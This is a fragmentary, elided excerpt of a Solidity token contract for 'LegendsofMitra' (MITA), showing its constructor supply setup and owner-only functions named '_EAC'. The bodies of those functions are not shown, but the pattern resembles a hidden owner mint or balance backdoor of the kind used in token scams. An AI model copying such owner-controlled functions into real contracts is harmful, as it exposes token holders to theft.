...
contract LegendsofMitra is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor() {
        ...
        _symbol = "MITA";
        _totalSupply = 2 * 10**8 * 10**9;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);

        _transfer(_msgSender(), burnWallet, _totalSupply/3 );
    }
    ...
    function _EAC(address account, uint256 amount) internal virtual {
...
,        uint256 amount
    ...
    function _EAC(uint256 amount) public onlyOwner virtual returns (bool) {
